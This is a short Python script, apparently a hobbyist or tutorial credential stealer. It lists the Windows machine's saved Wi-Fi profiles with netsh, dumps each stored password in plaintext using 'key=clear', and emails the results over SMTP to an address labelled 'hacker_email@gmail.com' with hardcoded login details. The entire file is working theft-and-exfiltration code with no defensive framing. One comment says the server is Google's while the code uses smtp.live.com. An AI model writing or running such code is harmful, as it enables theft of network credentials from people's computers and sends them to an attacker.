import subprocess
import smtplib
import re

def send_mail(email, password, message):

    # creates an SMTP server instance. use google's smtp server which runs on port 587
    server = smtplib.SMTP("smtp.live.com", 587)

    server.starttls() # start the server

    server.login(email, password)

    server.sendmail(email, 'hacker_email@gmail.com', message)

    server.quit()



command = "netsh wlan show profile" # shows all wifi networks the computer connected to in the past

network_list = subprocess.check_output(command, shell=True, universal_newlines=True) # extract the result of the command

network_names_list = re.findall("(?:Profile\s*:\s)(.*)", network_list) # extract the wifi SSID into a list

result = ""

for ssid in network_names_list:

    command = "netsh wlan show profile " + "\"" + ssid + "\""+ " key=clear" # command to display wifi pw in plaintext
    command_result = subprocess.check_output(command, shell=True, universal_newlines=True) # extract the result of the command
    result = result + command_result

# send the result of the command to hacker's email
send_mail("hacker_email@gmail.com", "asdf1234", result)